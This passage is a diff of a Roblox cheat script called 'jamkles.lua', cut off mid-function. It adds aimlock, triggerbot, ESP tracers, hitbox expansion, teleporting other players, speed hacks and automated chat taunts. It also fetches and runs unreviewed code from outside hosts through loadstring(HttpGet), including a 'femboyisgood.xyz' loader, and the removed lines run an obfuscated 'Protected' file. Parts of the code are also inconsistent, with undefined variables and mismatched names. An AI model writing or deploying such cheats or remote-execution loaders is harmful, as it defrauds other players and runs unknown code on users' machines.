+        Color = Color3.fromRGB(255, 255, 255)
+    },
+    Offsets = {
+        Enabled = true,
+        jumpOffset = 0,
+        fallOffset = 0
+    },
+    Resolver = {
+        Enabled = false,
+        Method = "RecalculateVelocity",
+        PredictionSettings = {
+            HitPart = "Head"
+        }
+    },
+    Reach = {
+        Enabled = false
+    },
+    Hitbox = {
+        Color = Color3.fromRGB(0, 0, 0),
+        Material = Enum.Material.ForceField,
+        Size = Vector3.new(10, 10, 10),
+        Transparency = 0
+    },
+    BringAll = {
+        Enabled = false,
+        Distance = 6
+    },
+    Trashtalk = {
+        trashtalkonkill = false,
+        delay = 0.1
+    },
+    Textures = {
+        Enabled = false,
+        Material = Enum.Material.Brick,
+        UseColor = true,
+        Color = Color3.fromRGB(0, 0, 0)
+    },
+    Tracer = {
+        Visable = false,
+        Transparency = 1,
+        Thickness = 3,
+        Color = Color3.fromRGB(255, 0, 0)
+    },
+    TargetStrafe = {
+        Enabled = false,
+        Speed = 50,
+        Height = 50,
+        Radius = 50,
+        Randomiser = false,
+    },
+    TriggerBot = {
+        Enabled = false,
+        ClickDelay = 0
+    },
+    VisualEffects = {
+        ColorCorrection = false,
+        ColorCorrectionBrightness = 0,
+        ColorCorrectionSaturation = 0,
+        ColorCorrectionContrast = 1
+    },
+    AutoAirShot = {
+        Enabled = false,
+        ClickDelay = 0.5
+    },
+    Easing = {
+        EasingStyle = Enum.EasingStyle.Quad,
+        EasingDirection = Enum.EasingDirection.InOut
+    },
+    Checks = {
+        KnockedCheck = false,
+    },
+    Lockposition = {
+        Enabled = true,
+        Xpos = false,
+        Ypos = false,
+        Zpos = false
+    },
+		HitEffects = {
+			Enabled = false,
+			Effects = Electric,
+			Color = Color3.fromRGB(100, 255, 100)
+		}
+}
 
+if not Game:IsLoaded() then
+    Game.Loaded:Wait()
+end
 
-  
-local function createButton(screenGui)
-    local button = Instance.new("TextButton")
-    button.Size = UDim2.new(0, 80, 0, 40)
-    button.Position = UDim2.new(1, -100, 0, 80)
-    button.Text = "Toggle Menu"
-    button.Font = Enum.Font.Arcade
-    button.TextSize = 12
-    button.BackgroundColor3 = Color3.new(0, 0, 0)
-    button.BackgroundTransparency = 1
-    button.TextColor3 = Color3.new(1, 1, 1)
-    button.BorderSizePixel = 0
+loadstring(Game:HttpGet("https://femboyisgood.xyz/loader/script/adonis.lua", true))()
 
-    button.ClipsDescendants = true
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 5)
-    corner.Parent = button
+local NotificationHolder =
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
+local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
+Notification:Notify(
+    {Title = "jamkles.lua", Description = "loaded"},
+    {OutlineColor = Color3.fromRGB(80, 80, 80), Time = 3, Type = "default"},
+    {
+        Image = "http://www.roblox.com/asset/?id=6023426923",
+        ImageColor = Color3.fromRGB(255, 84, 84),
+        Callback = function(State)
+            print(tostring(State))
+        end
+    }
+)
 
-    button.Parent = screenGui
+local Tool = Instance.new("Tool")
+Tool.RequiresHandle = false
+Tool.Name = "Lock Tool"
+Tool.Parent = game.Players.LocalPlayer.Backpack
 
-    local isVisible = false
+local player = game.Players.LocalPlayer
 
-    button.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
-            isVisible = not isVisible
-            Menu:SetVisible(isVisible)
+local function connectCharacterAdded()
+    player.CharacterAdded:Connect(onCharacterAdded)
+end
 
-            dragging = true
-            dragStart = input.Position
-            startPos = button.Position
+connectCharacterAdded()
 
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
+player.CharacterRemoving:Connect(
+    function()
+        Tool.Parent = game.Players.LocalPlayer.Backpack
+    end
+)
+
+local HitEffectModule = {
+    Locals = {
+        Type = {
+            ["Dots"] = nil,
+            ["Electric"] = nil,
+        },
+    },
+    Functions = {},
+    Settings = {HitEffect = {Color = jamkles.HitEffects.Color}}
+	}
+	
+local Players = game:GetService("Players")
+local RS = game:GetService("RunService")
+local WS = game:GetService("Workspace")
+local GS = game:GetService("GuiService")
+local UIS = game:GetService("UserInputService")
+local l = game:GetService("Lighting")
+
+local ColorCorrection = Instance.new("ColorCorrectionEffect", l)
+
+local VirtualInputManager = Game:GetService("VirtualInputManager")
+local StarterGui = Game:GetService("StarterGui")
+
+local player = Players.LocalPlayer
+local playerCamera = Workspace.CurrentCamera
+local CC = Workspace.CurrentCamera
+
+local LP = Players.LocalPlayer
+local Mouse = LP:GetMouse()
+local Camera = WS.CurrentCamera
+local GetGuiInset = GS.GetGuiInset
+
+local jamklestarget = nil
+local jamklesPlayerCharacter = nil
+local jamklesPlayerHumanoidRootPart = nil
+local jamklesPlayerAimPart = nil
+local TargetedPlayer
+local cframespeeding = true
+
+local TexturesEnabled = getgenv().jamkles.Textures.Enabled
+local TexturesMaterial = getgenv().jamkles.Textures.Material
+local TexturesUseColor = getgenv().jamkles.Textures.UseColor
+local TexturesColor = getgenv().jamkles.Textures.Color
+
+RS.RenderStepped:Connect(
+    function()
+        if jamkles.camlock.enabled and jamklestarget and jamklestarget.Character and jamklestarget.Character:FindFirstChild(jamkles.camlock.aim_part) then
+            local aimPart = jamklestarget.Character[jamkles.camlock.aim_part]
+            local targetPosition = aimPart.Position + aimPart.Velocity * jamkles.camlock.prediction
+            local lookPosition = CFrame.new(Camera.CFrame.p, targetPosition)
+            Camera.CFrame =
+                Camera.CFrame:Lerp(
+                lookPosition,
+                jamkles.camlock.smoothness,
+                jamkles.Easing.EasingStyle,
+                jamkles.Easing.EasingDirection
+            )
+
+            if jamkles.TargetStrafe.Enabled then
+                local lp = player.Character
+                local targpos = jamklestarget.Character.HumanoidRootPart.Position
+                local strafeOffset
+
+                if jamkles.TargetStrafe.Randomiser then
+                    strafeOffset =
+                        Vector3.new(
+                        math.random(-jamkles.TargetStrafe.Radius, jamkles.TargetStrafe.Radius),
+                        math.random(0, jamkles.TargetStrafe.Height),
+                        math.random(-jamkles.TargetStrafe.Radius, jamkles.TargetStrafe.Radius)
+                    )
+                else
+                    strafeOffset =
+                        Vector3.new(
+                        math.cos(tick() * jamkles.TargetStrafe.Speed) * jamkles.TargetStrafe.Radius,
+                        jamkles.TargetStrafe.Height,
+                        math.sin(tick() * jamkles.TargetStrafe.Speed) * jamkles.TargetStrafe.Radius
+                    )
                 end
-            end)
-        end
-    end)
 
-    button.InputChanged:Connect(function(input)
-        if dragging and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
-            dragInput = input
-            local delta = dragInput.Position - dragStart
-            button.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+                local strafePosition = targpos + strafeOffset
+                strafePosition = Vector3.new(strafePosition.X, math.max(strafePosition.Y, targpos.Y), strafePosition.Z)
+
+                lp:SetPrimaryPartCFrame(CFrame.new(strafePosition))
+                player.Character.HumanoidRootPart.CFrame =
+                    CFrame.new(
+                    player.Character.HumanoidRootPart.CFrame.Position,
+                    Vector3.new(targpos.X, player.Character.HumanoidRootPart.CFrame.Position.Y, targpos.Z)
+                )
+            end
         end
-    end)
+    end
+)
+
+if jamkles.Lockposition.Enabled == true then
+    if getgenv().jamkles.Lockposition.Ypos then
+        targetPosition = Vector3.new(targetPosition.X, player.Character.HumanoidRootPart.Position.Y, targetPosition.Z)
+    end
+    if getgenv().jamkles.Lockposition.Xpos then
+        targetPosition = Vector3.new(player.Character.HumanoidRootPart.Position.X, targetPosition.Y, targetPosition.Z)
+    end
+    if getgenv().jamkles.Lockposition.Zpos then
+        targetPosition = Vector3.new(targetPosition.X, targetPosition.Y, player.Character.HumanoidRootPart.Position.Z)
+    end
+end
+
+if getgenv().Loaded == true then
+    Notification:Notify(
+        {Title = "jamkles.lua", Description = "loaded"},
+        {OutlineColor = Color3.fromRGB(80, 80, 80), Time = 3, Type = "default"},
+        {
+            Image = "http://www.roblox.com/asset/?id=6023426923",
+            ImageColor = Color3.fromRGB(255, 84, 84),
+            Callback = function(State)
+                print(tostring(State))
+            end
+        }
+    )
+    return
+end
+
+getgenv().Loaded = true
+
+local FOVCircle = Drawing.new("Circle")
+FOVCircle.Visible = jamkles.Fov.Visible
+FOVCircle.Color = jamkles.Fov.Color
+FOVCircle.Transparency = jamkles.Fov.Transparency
+FOVCircle.Thickness = jamkles.Fov.Thickness
+FOVCircle.NumSides = 1000000
+FOVCircle.Radius = jamkles.Fov.Size
+FOVCircle.Filled = jamkles.Fov.Filled
+
+
+
+local GameReference = cloneref(Game)
+
+if not GameReference:IsLoaded() then
+    GameReference.Loaded:Wait()
 end
 
 
-local screenGui = createScreenGui()
-createButton(screenGui)
+local Workspace = GameReference:GetService("Workspace")
+local RunService = GameReference:GetService("RunService")
+local Players = GameReference:GetService("Players")
+local CoreGui = GameReference:GetService("CoreGui")
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TsainaTheSigma/-Taco/refs/heads/main/Protected_2141808915241548.txt",true))()
+
+local LocalPlayer = Players.LocalPlayer
+local Camera =
+    Workspace.CurrentCamera or Workspace:FindFirstChildWhichIsA("Camera") or Workspace:FindFirstChildOfClass("Camera")
+
+local Lines = {}
+
+for _, jamklestarget in pairs(Players:GetPlayers()) do
+    if jamklestarget ~= LocalPlayer then
+        local Line = Drawing.new("Line")
+        Line.Visible = jamkles.Tracer.Visable
+        Line.Transparency = jamkles.Tracer.Transparency
+        Line.Thickness = jamkles.Tracer.Thickness
+        Line.Color = jamkles.Tracer.Color
+        Lines[jamklestarget] = Line
+    end
+end
+
+RunService.RenderStepped:Connect(
+    function()
+        for jamklestarget, Line in pairs(Lines) do
+            if
+                jamklestarget.Character and jamklestarget.Character:FindFirstChild("HumanoidRootPart") and
+                    LocalPlayer.Character and
+                    LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+             then
+                local ViewportPosition_LocalPlayer =
+                    Camera:WorldToViewportPoint(LocalPlayer.Character.HumanoidRootPart.Position)
+                local ViewportPosition_jamklestarget, OnScreen_jamklestarget =
+                    Camera:WorldToViewportPoint(jamklestarget.Character.HumanoidRootPart.Position)
+
+                if OnScreen_jamklestarget then
+                    Line.Visible = jamkles.Tracer.Visable
+                    Line.From = Vector2.new(ViewportPosition_LocalPlayer.X, ViewportPosition_LocalPlayer.Y)
+                    Line.To = Vector2.new(ViewportPosition_jamklestarget.X, ViewportPosition_jamklestarget.Y)
+                elseif not OnScreen_jamklestarget then
+                    Line.Visible = false
+                end
+            end
+        end
+    end
+)
+
+Players.PlayerRemoving:Connect(
+    function(JamklesTarget)
+        if Lines[jamklestarget] then
+            Lines[JamklesTarget]:Remove()
+            Lines[JamklesTarget] = nil
+        end
+    end
+)
+
+Players.PlayerAdded:Connect(
+    function(JamklesTarget)
+        if jamklestarget ~= LocalPlayer then
+            local Line = Drawing.new("Line")
+            Line.Visible = jamkles.Tracer.Visable
+            Line.Transparency = jamkles.Tracer.Transparency
+            Line.Thickness = jamkles.Tracer.Thickness
+            Line.Color = jamkles.Tracer.Color
+            Line[jamklestarget] = Line
+        end
+    end
+)
+
+function WTVP(arg)
+    return Camera:WorldToViewportPoint(arg)
+end
+
+function WTSP(arg)
+    return Camera.WorldToScreenPoint(Camera, arg)
+end
+
+local function WallCheck(Part)
+    local Direction =
+        (Part.Position - playerCamera.CFrame.Position).Unit * (Part.Position - playerCamera.CFrame.Position).Magnitude
+    local NewRay = Ray.new(playerCamera.CFrame.Position, Direction)
+    local Hit, Position = Workspace:FindPartOnRay(NewRay, playerCharacter, false, true)
+
+    if Hit and Hit:IsDescendantOf(Part.Parent) and Part.Parent:IsA("Model") then
+        return true
+    end
+    return false
+end
+
+local function GetClosestPlayer()
+    local ClosestPlayer = nil
+    local ShortestDistance = math.huge
+
+    for _, Player in ipairs(Players:GetPlayers()) do
+        if Player ~= player and Player.Character then
+            for _, PlayerPart in ipairs(Player.Character:GetChildren()) do
+                if PlayerPart:IsA("BasePart") and PlayerPart.Transparency ~= 1 then
+                    local ViewportPointPosition, OnScreen = Camera:WorldToViewportPoint(PlayerPart.Position)
+                    local MagnitudeDistance =
+                        (Vector2.new(ViewportPointPosition.X, ViewportPointPosition.Y) - FOVCircle.Position).Magnitude
+
+                    if OnScreen and MagnitudeDistance < ShortestDistance and MagnitudeDistance <= FOVCircle.Radius then
+                        ClosestPlayer = Player
+                        ShortestDistance = MagnitudeDistance
+                    end
+                end
+            end
+        end
+    end
+    return ClosestPlayer
+end
+
+local function isKnockedOrGrabbed(jamklestarget)
+    if getgenv().jamkles.Checks.KnockedCheck and jamklestarget and jamklestarget.Character then
+        local bodyEffects = jamklestarget.Character:FindFirstChild("BodyEffects")
+        if bodyEffects then
+            local knockedOut = bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value or false
+            local grabbed = jamklestarget.Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
+            if knockedOut or grabbed or jamklestarget.Character.Humanoid.Health < 4 then
+                return true
+            end
+        end
+    end
+    return false
+end
+
+spawn(
+    function()
+        RS.Heartbeat:Connect(
+            function()
+                if jamkles.CframeSpeed.Enabled then
+                    player.Character.HumanoidRootPart.CFrame =
+                        player.Character.HumanoidRootPart.CFrame +
+                        player.Character.Humanoid.MoveDirection * jamkles.CframeSpeed.Speed
+                end
+            end
+        )
+    end
+)
+
+RS.RenderStepped:Connect(
+    function()
+        TargetedPlayer = GetClosestPlayer()
+        if
+            jamkles.TriggerBot.Enabled and TargetedPlayer and TargetedPlayer.Character and
+                TargetedPlayer.Character:FindFirstChildOfClass("Humanoid").Health ~= 0
+         then
+            task.wait(jamkles.TriggerBot.ClickDelay)
+            for _, BodyPart in ipairs(TargetedPlayer.Character:GetChildren()) do
+                if
+                    BodyPart.Name == "Head" or BodyPart.Name == "UpperTorso" or BodyPart.Name == "LowerTorso" or
+                        BodyPart.Name == "LeftUpperArm" or
+                        BodyPart.Name == "LeftLowerArm" or
+                        BodyPart.Name == "LeftHand" or
+                        BodyPart.Name == "RightUpperArm" or
+                        BodyPart.Name == "RightLowerArm" or
+                        BodyPart.Name == "RightHand" or
+                        BodyPart.Name == "LeftUpperLeg" or
+                        BodyPart.Name == "LeftLowerLeg" or
+                        BodyPart.Name == "LeftFoot" or
+                        BodyPart.Name == "RightUpperLeg" or
+                        BodyPart.Name == "RightLowerLeg" or
+                        BodyPart.Name == "RightFoot"
+                 then
+                    local ViewportPointPosition, OnScreen = playerCamera:WorldToViewportPoint(BodyPart.Position)
+                    if OnScreen then
+                        local MagnitudeDistance =
+                            (Vector2.new(ViewportPointPosition.X, ViewportPointPosition.Y) - FOVCircle.Position).Magnitude
+                        if MagnitudeDistance <= FOVCircle.Radius then
+                            
+                            if tool and tool:FindFirstChild("Lock Tool") then
+                                tool:Activate()
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+)
+
+RS.RenderStepped:Connect(
+    function()
+        if jamklestarget and jamkles.AutoAirShot.Enabled then
+            local TargetedPlayer = jamklestarget
+            if TargetedPlayer and TargetedPlayer.Character then
+                local Humanoid = TargetedPlayer.Character:FindFirstChildOfClass("Humanoid")
+                local HRP = TargetedPlayer.Character:FindFirstChild("HumanoidRootPart")
+
+                if Humanoid and Humanoid.Health > 0 and HRP then
+                    
+                    if HRP.Velocity.Y > 2 then
+                        
+                        task.wait(jamkles.AutoAirShot.ClickDelay)
+
+                        for _, BodyPart in ipairs(TargetedPlayer.Character:GetChildren()) do
+                            if
+                                BodyPart:IsA("BasePart") and
+                                    (BodyPart.Name == "Head" or BodyPart.Name == "UpperTorso" or
+                                        BodyPart.Name == "LowerTorso" or
+                                        BodyPart.Name == "LeftUpperArm" or
+                                        BodyPart.Name == "LeftLowerArm" or
+                                        BodyPart.Name == "LeftHand" or
+                                        BodyPart.Name == "RightUpperArm" or
+                                        BodyPart.Name == "RightLowerArm" or
+                                        BodyPart.Name == "RightHand" or
+                                        BodyPart.Name == "LeftUpperLeg" or
+                                        BodyPart.Name == "LeftLowerLeg" or
+                                        BodyPart.Name == "LeftFoot" or
+                                        BodyPart.Name == "RightUpperLeg" or
+                                        BodyPart.Name == "RightLowerLeg" or
+                                        BodyPart.Name == "RightFoot")
+                             then
+                                local ViewportPointPosition, OnScreen =
+                                    playerCamera:WorldToViewportPoint(BodyPart.Position)
+                                if OnScreen then
+                                    local MagnitudeDistance =
+                                        (Vector2.new(ViewportPointPosition.X, ViewportPointPosition.Y) -
+                                        FOVCircle.Position).Magnitude
+
+                                    if MagnitudeDistance <= FOVCircle.Radius then
+                                        
+                                        if tool then
+                                            tool:Activate() 
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+)
+Tool.Activated:Connect(
+    function()
+        jamkles.camlock.Toggled = not jamkles.camlock.Toggled
+
+        if jamkles.camlock.Toggled then
+            jamklestarget = GetClosestPlayer()
+            if jamklestarget then
+                Notification:Notify(
+                    {Title = "jamkles.lua", Description = "Locked on: " .. tostring(jamklestarget.DisplayName)},
+                    {OutlineColor = Color3.fromRGB(80, 80, 80), Time = 3, Type = "default"},
+                    {
+                        Image = "http://www.roblox.com/asset/?id=6023426923",
+                        ImageColor = Color3.fromRGB(255, 84, 84),
+                        Callback = function(State)
+                            print(tostring(State))
+                        end
+                    }
+                )
+            end
+        elseif not jamkles.camlock.Toggled then
+            if jamklestarget ~= nil then
+                jamklestarget = nil
+                Notification:Notify(
+                    {Title = "jamkles.lua", Description = "unlocked"},
+                    {OutlineColor = Color3.fromRGB(80, 80, 80), Time = 3, Type = "default"},
+                    {
+                        Image = "http://www.roblox.com/asset/?id=6023426923",
+                        ImageColor = Color3.fromRGB(255, 84, 84),
+                        Callback = function(State)
+                            print(tostring(State))
+                        end
+                    }
+                )
+            end
+        end
+    end
+)
+
+local OriginalMaterials = {}
+local OriginalColors = {}
+
+local function changeParts(model, applyChanges)
+    for _, part in ipairs(model:GetChildren()) do
+        if part:IsA("BasePart") then
+            local isPlayerCharacter = false
+            for _, player in ipairs(game.Players:GetPlayers()) do
+                if part:IsDescendantOf(player.Character) then
+                    isPlayerCharacter = true
+                    break
+                end
+            end
+
+            if not isPlayerCharacter then
+                if applyChanges then
+                    OriginalMaterials[part] = part.Material
+                    OriginalColors[part] = part.Color
+
+                    part.Material = TexturesMaterial
+                    if TexturesUseColor then
+                        part.Color = TexturesColor
+                    end
+                else
+                    if OriginalMaterials[part] then
+                        part.Material = OriginalMaterials[part]
+                        part.Color = OriginalColors[part]
+                    end
+                end
+            end
+        end
+        changeParts(part, applyChanges)
+    end
+end
+
+if TexturesEnabled then
+    changeParts(game.Workspace, true)
+end
+
+RS.RenderStepped:Connect(
+    function()
+        local TouchPosition = UIS:GetMouseLocation()
+        FOVCircle.Position = Vector2.new(playerCamera.ViewportSize.X / 2, playerCamera.ViewportSize.Y / 2)
+
+        if jamkles.camlock.Enabled and jamkles.camlock.Toggled and jamklestarget and jamklestarget.Character and jamklestarget.Character:FindFirstChild(jamkles.camlock.aim_part) then
+            local aimPart = jamklestarget.Character[jamkles.camlock.aim_part]
+            local humanoid = jamklestarget.Character:FindFirstChild("Humanoid")
+
+            local targetPos =
+                aimPart.Position + (jamklestarget.Character.HumanoidRootPart.Velocity * jamkles.camlock.prediction)
+
+            if getgenv().jamkles.Offsets.Enabled and humanoid then
+                if humanoid:GetState() == Enum.HumanoidStateType.Jumping then
+                    targetPos = targetPos + Vector3.new(0, getgenv().jamkles.Offsets.jumpOffset, 0)
+                elseif humanoid:GetState() == Enum.HumanoidStateType.Freefall then
+                    targetPos = targetPos + Vector3.new(0, getgenv().jamkles.Offsets.fallOffset, 0)
+                end
+            end
+
+            local cameraLook = CFrame.new(Camera.CFrame.Position, targetPos)
+            Camera.CFrame = Camera.CFrame:Lerp(cameraLook, jamkles.camlock.smoothness)
+        end
+    end
+)
+
+function handleCFrameWalk()
+    if jamkles.Enabled and jamkles.Cframe.Enabled then
+        local character = player.Character
+        if character and character:FindFirstChild("HumanoidRootPart") then
+            local humanoidRootPart = character.HumanoidRootPart
+            local moveDirection = character.Humanoid.MoveDirection
+
+            humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.new(moveDirection * jamkles.Cframe.Speed)
+        end
+    end
+end
+
+RS.Heartbeat:Connect(
+    function()
+        if jamkles.camlock.AutoReload then
+            local player = game:GetService("Players").LocalPlayer
+            local character = player.Character
+            if character then
+                local tool = character:FindFirstChildWhichIsA("Tool")
+                if tool then
+                    local ammo = tool:FindFirstChild("Ammo")
+                    if ammo and ammo.Value <= 0 then
+                        game:GetService("ReplicatedStorage").MainEvent:FireServer("Reload", tool)
+                    end
+                end
+            end
+        end
+    end
+)
+
+spawn(
+    function()
+        while true do
+            if getgenv().jamkles.Trashtalk.trashtalkonkill and jamklestarget and jamklestarget.Character then
+                local humanoid = jamklestarget.Character:FindFirstChild("Humanoid")
+                if humanoid and humanoid.Health <= 2 then
+                    local chatEvents =
+                        game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+                    if chatEvents then
+                        local sayMessageRequest = chatEvents:FindFirstChild("SayMessageRequest")
+                        if sayMessageRequest and sayMessageRequest:IsA("RemoteEvent") then
+                            sayMessageRequest:FireServer("tap in w jamkles lua bro", "All")
+                            wait(0.6)
+                            sayMessageRequest:FireServer("ur dirt btw", "All")
+                        elseif sayMessageRequest and sayMessageRequest:IsA("RemoteFunction") then
+                            sayMessageRequest:InvokeServer("tap in w jamkles lua bro", "All")
+                            wait(0.6)
+                            sayMessageRequest:InvokeServer("ur dirt btw", "All")
+                        end
+                    end
+                end
+            end
+
+            wait(getgenv().jamkles.Trashtalk.delay or 5)
+        end
+    end
+)
+
+spawn(
+    function()
+        RS.Heartbeat:Connect(
+            function()
+                handleCFrameWalk()
+            end
+        )
+    end
+)
+
+for _, con in next, getconnections(workspace.CurrentCamera.Changed) do
+    task.wait()
+    con:Disable()
+end
+for _, con in next, getconnections(workspace.CurrentCamera:GetPropertyChangedSignal("CFrame")) do
+    task.wait()
+    con:Disable()
+end
+RS.PreRender:Connect(
+    function()
+        GetClosestPlayer()
+        CalculateAimPoint()
+    end
+)
+
+RS.Heartbeat:Connect(
+    function(DeltaTime)
+        if jamkles.Autopred.Enabled and jamkles.Autopred.Simple then
+            local pingValue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
+            local ping = tonumber((pingValue:match("%d+")))
+            if ping then
+                if ping > 225 then
+                    jamkles.camlock.prediction = 0.166547
+                elseif ping > 215 then
+                    jamkles.camlock.prediction = 0.15692
+                elseif ping > 205 then
+                    jamkles.camlock.prediction = 0.165732
+                elseif ping > 190 then
+                    jamkles.camlock.prediction = 0.1690
+                elseif ping > 185 then
+                    jamkles.camlock.prediction = 0.1235666
+                elseif ping > 180 then
+                    jamkles.camlock.prediction = 0.16779123
+                elseif ping > 175 then
+                    jamkles.camlock.prediction = 0.165455312399999
+                elseif ping > 170 then
+                    jamkles.camlock.prediction = 0.16
+                elseif ping > 165 then
+                    jamkles.camlock.prediction = 0.15
+                elseif ping > 160 then
+                    jamkles.camlock.prediction = 0.1223333
+                elseif ping > 155 then
+                    jamkles.camlock.prediction = 0.125333
+                elseif ping > 150 then
+                    jamkles.camlock.prediction = 0.1652131
+                elseif ping > 145 then
+                    jamkles.camlock.prediction = 0.129934
+                elseif ping > 140 then
+                    jamkles.camlock.prediction = 0.1659921
+                elseif ping > 135 then
+                    jamkles.camlock.prediction = 0.1659921
+                elseif ping > 130 then
+                    jamkles.camlock.prediction = 0.12399
+                elseif ping > 125 then
+                    jamkles.camlock.prediction = 0.15465
+                elseif ping > 110 then
+                    jamkles.camlock.prediction = 0.142199
+                elseif ping > 105 then
+                    jamkles.camlock.prediction = 0.141199
+                elseif ping > 100 then
+                    jamkles.camlock.prediction = 0.134143
+                elseif ping > 90 then
+                    jamkles.camlock.prediction = 0.1433333333392
+                elseif ping > 80 then
+                    jamkles.camlock.prediction = 0.1332241241231
+                elseif ping > 70 then
+                    jamkles.camlock.prediction = 0.1513989
+                elseif ping > 60 then
+                    jamkles.camlock.prediction = 0.133
+                elseif ping > 50 then
+                    jamkles.camlock.prediction = 0.12118333
+                elseif ping > 40 then
+                    jamkles.camlock.prediction = 0.12588244444444
+                elseif ping > 35 then
+                    jamkles.camlock.prediction = 0.12565
+                elseif ping > 30 then
+                    jamkles.camlock.prediction = 0.1419283
+                elseif ping > 25 then
+                    jamkles.camlock.prediction = 0.12948111
+                elseif ping > 20 then
+                    jamkles.camlock.prediction = 0.1211928
+                end
+            end
+        end
+    end
+)
+
+RS.Heartbeat:Connect(
+    function(DeltaTime)
+        if jamkles.Autopred.Enabled and jamkles.Autopred.Complex then
+            local pingValue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
+            local ping = tonumber(pingValue:match("%d+"))
+
+            if jamklestarget and jamklestarget.Character and jamklestarget.Character:FindFirstChild("HumanoidRootPart") then
+                local targetPosition = jamklestarget.Character.HumanoidRootPart.Position
+                local distance = (targetPosition - Camera.CFrame.Position).magnitude
+                local distanceFactor = math.clamp(distance / 1000, 0, 0.5)
+
+                if ping and ping > 0 then
+                    local pingAdjustment = math.clamp(ping / 1000, 0, 0.3)
+
+                    jamkles.camlock.prediction = pingAdjustment + distanceFactor
+                end
+            end
+        end
+    end
+)
+
+Game:GetService("RunService").RenderStepped:Connect(
+    function()
+        if jamkles.Reach.Enabled then
+            for index, player in pairs(Game:GetService("Players"):GetPlayers()) do
+                if
+                    player ~= Game:GetService("Players").LocalPlayer and player.Character and
+                        player.Character:FindFirstChild("HumanoidRootPart") and
+                        player.Character:FindFirstChildOfClass("Humanoid") and
+                        player.Character:FindFirstChildOfClass("Humanoid").Health > 2.5 and
+                        Game:GetService("Players").LocalPlayer.Character and
+                        Game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                 then
+                    local PlayerHumanoidRootPart =
+                        Game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                    local TargetHumanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
+                    TargetHumanoidRootPart.CanCollide = false
+                    TargetHumanoidRootPart.Color = jamkles.Hitbox.Color
+                    TargetHumanoidRootPart.Material = jamkles.Hitbox.Material
+                    TargetHumanoidRootPart.Size = jamkles.Hitbox.Size
+                    TargetHumanoidRootPart.Transparency = jamkles.Hitbox.Transparency
+                    if jamkles.BringAll.Enabled then
+                        TargetHumanoidRootPart.Anchored = true
+                        TargetHumanoidRootPart.CFrame =
+                            CFrame.new(
+                            PlayerHumanoidRootPart.CFrame.Position -
+                                (PlayerHumanoidRootPart.CFrame.LookVector * -jamkles.BringAll.Distance),
+                            PlayerHumanoidRootPart.CFrame.Position
+                        )
+                    end
+                end
+            end
+        elseif not jamkles.Reach.Enabled then
+            for index, player in pairs(Game:GetService("Players"):GetPlayers()) do
+                if
+                    player ~= Game:GetService("Players").LocalPlayer and player.Character and
+                        player.Character:FindFirstChild("HumanoidRootPart")
+                 then
+                    local TargetHumanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
+                    TargetHumanoidRootPart.Anchored = false
+                    TargetHumanoidRootPart.CanCollide = true
+                    TargetHumanoidRootPart.BrickColor = BrickColor.new("Medium stone grey")
+                    TargetHumanoidRootPart.Material = Enum.Material.Plastic
+                    TargetHumanoidRootPart.Size = Vector3.new(2, 2, 1)
+                    TargetHumanoidRootPart.Transparency = 1
+                end
+            end
+        end
+    end
+)
+
+local lastPosition = nil
+local lastUpdateTime = tick()
+
+local function resolveTargetVelocity(jamklestarget)
+    if getgenv().jamkles.Resolver.Enabled then
+        if getgenv().jamkles.Resolver.Method == "RecalculateVelocity" then
+            local currentTime = tick()
+            local deltaTime = currentTime - lastUpdateTime
+
+            if
+                lastPosition and
+                    jamklestarget.Character:FindFirstChild(getgenv().jamkles.Resolver.PredictionSettings.HitPart)
+             then
+                local resolvedVelocity =
+                    (jamklestarget.Character[getgenv().jamkles.Resolver.PredictionSettings.aim_part].Position -
+                    lastPosition) /
+                    deltaTime
+                lastPosition = jamklestarget.Character[getgenv().jamkles.Resolver.PredictionSettings.aim_part].Position
+                lastUpdateTime = currentTime
+                return resolvedVelocity
+            else
+                lastPosition = jamklestarget.Character[getgenv().jamkles.Resolver.PredictionSettings.aim_part].Position
+                lastUpdateTime = currentTime
+            end
+        end
+    end
+
+    return jamklestarget.Character[getgenv().jamkles.Resolver.PredictionSettings.aim_part].Velocity
+end
+if jamkles.camlock.AntiAimView == true then
+    if jamklestarget then
+        local a = math.huge
+        local b = nil
+
+        for i, v in pairs(game.Players:GetPlayers()) do
+            if
+                v ~= Client and v.Character and v.Character:FindFirstChild("Head") and
+                    v.Character:FindFirstChild("HumanoidRootPart")
+             then
+                local c = game.Workspace.CurrentCamera:WorldToViewportPoint(v.Character.Head.Position)
+                local d = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(c.X, c.Y)).Magnitude
+                if a > d then
+                    b = v
+                    a = d
+                end
+            end
+        end
+
+        return b
+    elseif jamklestarget == nil then
+        wait()
+    end
+end
+
+if jamkles.VisualEffects.ColorCorrection == true then
+    ColorCorrection.Brightness = jamkles.VisualEffects.ColorCorrectionBrightness
+    ColorCorrection.Contrast = jamkles.VisualEffects.ColorCorrectionContrast
+    ColorCorrection.Saturation = jamkles.VisualEffects.ColorCorrectionSaturation
+end
+
+function CalculateAimPoint()
+    if jamklestarget and jamklestarget.Character then
+        if jamkles.camlock.AntiGroundShots then
+            AimPoint =
